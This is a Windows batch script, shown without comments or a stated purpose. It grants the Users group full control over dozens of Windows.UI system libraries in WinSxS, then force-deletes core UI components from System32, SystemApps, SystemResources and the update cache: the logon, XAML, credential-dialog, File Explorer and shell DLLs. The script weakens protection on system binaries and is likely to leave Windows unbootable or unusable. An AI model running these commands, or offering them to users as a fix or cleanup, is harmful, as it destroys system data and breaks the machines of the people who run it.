icacls "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\r\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\f\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\r\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\f\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\r\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\f\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\r\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_b4d146a6237f2ed1\Windows.UI.Input.Inking.Analysis.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\f\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\r\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\n\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\f\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\r\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\f\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\r\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\f\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\r\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\f\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\r\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\f\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\r\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\f\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\r\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\f\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\r\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_19a220900e8acc6b\Windows.UI.Input.Inking.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\f\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\r\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\f\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\r\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\f\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\r\Windows.UI.XamlHost.dll" /t /Grant Users:F
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.3085_en-us_ebec9472220fccb9\f\Windows.UI.TaskManager.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.3085_none_8eff6b1166eefbd0\f\Windows.UI.TaskManager.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.3085_none_d303bc8cc4c7d6b7\f\Windows.UI.AppDefaults.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.Resources.Common.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.3085_en-us_be7ed3d378d84149\f\Windows.UI.SettingsAppThreshold.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.3085_none_fad69a9a12776d02\f\Windows.UI.SettingsAppThreshold.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.3085_none_9a026182b4fa1065\f\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.winmd" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e22057df2a3d015d\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.3085_none_00c4aed399529e96\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3085_none_28db717fd11ea409\f\Windows.UI.QuickActions.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e1ffbc49d8a9196f\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.3085_none_dcf2fafd7a5e2e6e\f\Windows.UI.SoftLanding.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3085_none_5dff1e02ce871016\f\Windows.UI.SettingsHandlers-nt.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3085_en-us_1a0228b45205ac4c\f\Windows.UI.ShellCommon.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.3085_en-us_f3f91c5355a1ddd5\f\Windows.UI.Logon.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_670ccfae16aa6c34\f\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.3085_en-us_370656fdaee3e5d7\f\Windows.UI.PCShell.en-US.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.3085_none_f4b7447f323ee4ca\f\Windows.UI.PCShell.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3085_none_b4839d6e2e3ceff5\f\Windows.UI.ShellCommon.pri" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.3085_none_e5de8b43cd7cd99c\f\Windows.UI.Storage.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_a1632e309e666bf8\f\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.winmd" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_71617a004b0b2e2f\f\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.AppDefaults.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.BioFeedback.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.BlockedShutdown.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Input.Inking.Analysis.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Logon.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.NetworkUXController.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.PicturePassword.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Shell.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Shell.Internal.AdaptiveCards.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Storage.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.19h1.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.21h1.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.Common.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.rs1.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.rs2.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.rs3.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.rs4.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.rs5.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.th.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.win81.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.Xaml.Resources.win8rtm.dll" /f /s /q
del "C:\Windows\System32\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.AppDefaults.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.CredDialogController.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.FileExplorer.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.FileExplorer.WASDK.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Immersive.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Input.Inking.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.PicturePassword.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Xaml.Controls.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Xaml.InkControls.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Xaml.Maps.dll.mui" /f /s /q
del "C:\Windows\System32\en-US\Windows.UI.Xaml.Phone.dll.mui" /f /s /q
del "C:\Windows\System32\ShellExperiences\Windows.UI.Shell.SharedUtilities.dll" /f /s /q
del "C:\Windows\System32\WinMetadata\Windows.UI.winmd" /f /s /q
del "C:\Windows\System32\WinMetadata\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.ActionCenter.dll" /f /s /q
del "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.QuickActions.dll" /f /s /q
del "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.SoftLanding.dll" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BioFeedback" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.BlockedShutdown" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Cred" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Immersive.dll.mun" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Logon" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PCShell" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.PrintDialog" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Search" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.Shell" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommon" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.TaskManager" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Windows.UI.AccountsControl.pri" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-100.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-125.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-150.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-200.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-250.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-300.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-400.png" /f /s /q
del "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-100.png" /f /s /q
